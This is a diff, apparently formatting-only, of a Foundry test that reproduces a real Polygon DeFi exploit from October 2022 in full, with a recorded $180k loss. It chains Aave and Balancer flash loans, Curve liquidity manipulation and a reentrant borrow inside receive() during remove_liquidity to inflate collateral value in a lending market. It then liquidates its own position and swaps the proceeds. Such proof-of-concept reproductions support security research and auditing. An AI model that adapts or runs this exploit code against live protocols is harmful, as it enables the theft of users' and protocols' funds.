@@ -3,11 +3,11 @@ pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
 
-// Total Lost: $180k 
+// Total Lost: $180k
 // Attacker: 0x4206d62305d2815494dcdb759c4e32fca1d181a0
 // Attack Contract: 0xEb4c67E5BE040068FA477a539341d6aeF081E4Eb
-// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943 
-// Attack Tx: https://phalcon.blocksec.com/tx/polygon/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558 
+// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943
+// Attack Tx: https://phalcon.blocksec.com/tx/polygon/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558
 //            https://polygonscan.com/tx/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558
 
 // @Analyses
@@ -17,50 +17,55 @@ import "forge-std/Test.sol";
 // https://twitter.com/BeosinAlert/status/1584551399941365763
 
 contract Liquidator {
-    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 = CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
-    ICErc20Delegate private constant CErc20Delegate_mMAI_4           = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
-    BeefyVault      private constant beefyVault                      = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);  
-    IERC20          private constant miMATIC                         = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1); 
-    
+    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 =
+        CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    ICErc20Delegate private constant CErc20Delegate_mMAI_4 = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    BeefyVault private constant beefyVault = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
+    IERC20 private constant miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
+
     // https://www.youtube.com/watch?v=w-oVV0Ie3Fw&t=188s&ab_channel=SmartContractProgrammer
-    function liquidate(address main) external { 
+    function liquidate(address main) external {
         // use 70_420 miMATIC as repayAmount for liquidation
         miMATIC.approve(address(CErc20Delegate_mMAI_4), type(uint256).max);
-        require(CErc20Delegate_mMAI_4.liquidateBorrow(main, 70_420 ether, address(CErc20_mmooCurvestMATIC_MATIC_4)) == 0, "liquidate failed");   
+        require(
+            CErc20Delegate_mMAI_4.liquidateBorrow(main, 70_420 ether, address(CErc20_mmooCurvestMATIC_MATIC_4)) == 0,
+            "liquidate failed"
+        );
 
-        // redeem beefyVault token (mooCurvestMATIC-MATIC)    
-        CErc20_mmooCurvestMATIC_MATIC_4.redeem(CErc20_mmooCurvestMATIC_MATIC_4.balanceOf(address(this)));  
+        // redeem beefyVault token (mooCurvestMATIC-MATIC)
+        CErc20_mmooCurvestMATIC_MATIC_4.redeem(CErc20_mmooCurvestMATIC_MATIC_4.balanceOf(address(this)));
 
         // transfer all tokens to main attack contract
         beefyVault.transfer(main, beefyVault.balanceOf(address(this)));
-        miMATIC.transfer(main, miMATIC.balanceOf(address(this)));  
+        miMATIC.transfer(main, miMATIC.balanceOf(address(this)));
     }
 }
 
 contract MarketExploitTest is Test {
-    WETH9  private constant  WMATIC = WETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
+    WETH9 private constant WMATIC = WETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
     IERC20 private constant stMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
 
-    ILendingPool   private constant aaveLendingPool = ILendingPool(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
-    IBalancerVault private constant balancerVault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    ILendingPool private constant aaveLendingPool = ILendingPool(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
+    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
     ICurvePool private constant vyperContract = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
-    IERC20     private constant stMATIC_f     = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);      // Curve LP token
-    BeefyVault private constant beefyVault    = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);  // mooCurvestMATIC-MATIC
+    IERC20 private constant stMATIC_f = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d); // Curve LP token
+    BeefyVault private constant beefyVault = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85); // mooCurvestMATIC-MATIC
 
-    IUnitroller   private constant unitroller = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
-    IRouter       private constant router     = IRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
-    Uni_Router_V3 private constant routerV3   = Uni_Router_V3(0xf5b509bB0909a69B1c207E495f687a596C168E12);
+    IUnitroller private constant unitroller = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
+    IRouter private constant router = IRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
+    Uni_Router_V3 private constant routerV3 = Uni_Router_V3(0xf5b509bB0909a69B1c207E495f687a596C168E12);
 
-    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 = CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
-    ICErc20Delegate private constant CErc20Delegate_mMAI_4           = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 =
+        CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    ICErc20Delegate private constant CErc20Delegate_mMAI_4 = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
 
-    IERC20 private constant miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);  // MAI stablecoin
-    IERC20 private constant USDC    = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
+    IERC20 private constant miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1); // MAI stablecoin
+    IERC20 private constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
 
     function setUp() public {
-        vm.createSelectFork("https://polygon.llamarpc.com", 34716800);  // fork Polygon at block 34716800
-        vm.deal(address(this), 0);  // set address(this).balance to 0
+        vm.createSelectFork("https://polygon.llamarpc.com", 34_716_800); // fork Polygon at block 34716800
+        vm.deal(address(this), 0); // set address(this).balance to 0
     }
 
     function testHack() external {
@@ -73,28 +78,28 @@ contract MarketExploitTest is Test {
 
     function _aaveFlashLoan() internal {
         // flashloan WMATIC from Aave
-        address[] memory assets = new address[](1); 
-        assets[0] = address(WMATIC); 
+        address[] memory assets = new address[](1);
+        assets[0] = address(WMATIC);
 
-        uint256[] memory amounts = new uint256[](1); 
+        uint256[] memory amounts = new uint256[](1);
         amounts[0] = 15_419_963 ether;
 
-        uint256[] memory modes = new uint256[](1); 
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
 
         aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
     }
 
-    function executeOperation(       // Aave callback
+    function executeOperation( // Aave callback
         address[] memory assets,
         uint256[] memory amounts,
         uint256[] memory premiums,
         address initiator,
         bytes memory params
     ) external returns (bool) {
-        _balancerFlashLoan();  
+        _balancerFlashLoan();
 
-        WMATIC.approve(address(aaveLendingPool), type(uint256).max);  // repay
+        WMATIC.approve(address(aaveLendingPool), type(uint256).max); // repay
         return true;
     }
 
@@ -105,13 +110,13 @@ contract MarketExploitTest is Test {
         tokens[1] = address(stMATIC);
 
         uint256[] memory amountsBalancer = new uint256[](2);
-        amountsBalancer[0] = 34_580_036 ether;   // + 15_419_963 Aave -> 50M debt
-        amountsBalancer[1] = 19_664_260 ether;   
-        
+        amountsBalancer[0] = 34_580_036 ether; // + 15_419_963 Aave -> 50M debt
+        amountsBalancer[1] = 19_664_260 ether;
+
         balancerVault.flashLoan(address(this), tokens, amountsBalancer, "");
     }
 
-    function receiveFlashLoan(       // Balancer callback
+    function receiveFlashLoan( // Balancer callback
         IERC20[] memory tokens,
         uint256[] memory amounts,
         uint256[] memory feeAmounts,
@@ -126,15 +131,15 @@ contract MarketExploitTest is Test {
         WMATIC.transfer(address(balancerVault), 34_580_036 ether);
     }
 
-    function _exploit() internal {   
+    function _exploit() internal {
         // add liquidity to WMATIC/stMATIC Curve pool, receive Curve LP tokens stMATIC_f
         WMATIC.approve(address(vyperContract), type(uint256).max);
         stMATIC.approve(address(vyperContract), type(uint256).max);
 
-        vyperContract.add_liquidity([uint256(19_664_260 ether), uint256(49_999_999 ether)], 0);   // mint 34_640_026 stMATIC_f   
+        vyperContract.add_liquidity([uint256(19_664_260 ether), uint256(49_999_999 ether)], 0); // mint 34_640_026 stMATIC_f
 
         address[] memory market = new address[](1);
-        market[0] = address(CErc20_mmooCurvestMATIC_MATIC_4);   
+        market[0] = address(CErc20_mmooCurvestMATIC_MATIC_4);
         unitroller.enterMarkets(market);
 
         // deposit 90_000 stMATIC_f and mint 85901 mooCurvestMATIC-MATIC (BeefyVault token) as collateral to Market via Beefy Vault
@@ -143,50 +148,52 @@ contract MarketExploitTest is Test {
 
         // use 85_901 mooCurvestMATIC-MATIC to mint 429_505 Ctokens
         beefyVault.approve(address(CErc20_mmooCurvestMATIC_MATIC_4), type(uint256).max);
-        CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));  
+        CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));
 
         // remove liquidity from WMATIC/stMATIC Curve pool: receive WMATIC, stMATIC, miMATIC. This step increases collateral price
-        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true);  // burn stMATIC_f, trigger receive()  
+        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true); // burn stMATIC_f, trigger receive()
     }
 
     function _liquidate() internal {
         Liquidator liquidator = new Liquidator();
-        miMATIC.transfer(address(liquidator), miMATIC.balanceOf(address(this)));  // use MAI to liquidate collateral
+        miMATIC.transfer(address(liquidator), miMATIC.balanceOf(address(this))); // use MAI to liquidate collateral
         liquidator.liquidate(address(this));
 
         // take back stMATIC_f
         beefyVault.withdrawAll();
 
-        // remove liquidity from Curve pool 2nd time 
-        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true);  // burn stMATIC_f, trigger receive()
+        // remove liquidity from Curve pool 2nd time
+        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true); // burn stMATIC_f, trigger receive()
     }
 
     receive() external payable {
-        //  Borrow MAI with expensive collateral 
+        //  Borrow MAI with expensive collateral
         // (,uint256 amount,) = unitroller.getAccountLiquidity(address(this));  191
-        CErc20Delegate_mMAI_4.borrow(250_000 ether);  // 250_000 miMATIC 
+        CErc20Delegate_mMAI_4.borrow(250_000 ether); // 250_000 miMATIC
     }
 
     function _sellAll() internal {
         // wrap all native MATIC (from remove_liquidity) to WMATIC
-        WMATIC.deposit{value: address(this).balance}();  
+        WMATIC.deposit{value: address(this).balance}();
 
-        // swap all miMATIC for WMATIC to repay Aave 
+        // swap all miMATIC for WMATIC to repay Aave
         miMATIC.approve(address(router), type(uint256).max);
-        address [] memory path = new address[](3);
+        address[] memory path = new address[](3);
         path[0] = address(miMATIC);
         path[1] = address(USDC);
         path[2] = address(WMATIC);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(miMATIC.balanceOf(address(this)), 0, path, address(this), type(uint256).max);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            miMATIC.balanceOf(address(this)), 0, path, address(this), type(uint256).max
+        );
 
-        // swap some WMATIC for stMATIC to repay Balancer 
-        WMATIC.approve(address(routerV3), type(uint256).max);   
+        // swap some WMATIC for stMATIC to repay Balancer
+        WMATIC.approve(address(routerV3), type(uint256).max);
         Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
             tokenIn: address(WMATIC),
             tokenOut: address(stMATIC),
             deadline: type(uint256).max,
             recipient: address(this),
-            amountIn: 1355 ether,  
+            amountIn: 1355 ether,
             amountOutMinimum: 0,
             sqrtPriceLimitX96: 0
         });
@@ -205,8 +212,12 @@ interface CErc20Interface {
 }
 
 interface ICErc20Delegate {
-    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)  external returns (uint256);
-    function borrow(uint256 borrowAmount) external returns (uint256);       
+    function liquidateBorrow(
+        address borrower,
+        uint256 repayAmount,
+        address cTokenCollateral
+    ) external returns (uint256);
+    function borrow(uint256 borrowAmount) external returns (uint256);
 }
 
 interface BeefyVault {
@@ -236,9 +247,9 @@ interface IERC20 {
 
 interface WETH9 {
     function deposit() external payable;
-    function transfer(address to, uint value) external returns (bool);
-    function approve(address guy, uint wad) external returns (bool);
-    function withdraw(uint wad) external;
+    function transfer(address to, uint256 value) external returns (bool);
+    function approve(address guy, uint256 wad) external returns (bool);
+    function withdraw(uint256 wad) external;
     function balanceOf(address) external view returns (uint256);
 }
 
@@ -255,7 +266,12 @@ interface ILendingPool {
 }
 
 interface IBalancerVault {
-    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
+    function flashLoan(
+        address recipient,
+        address[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
 }
 
 interface ICurvePool {
@@ -283,5 +299,6 @@ interface Uni_Router_V3 {
         uint256 amountOutMinimum;
         uint160 sqrtPriceLimitX96;
     }
+
     function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
 }
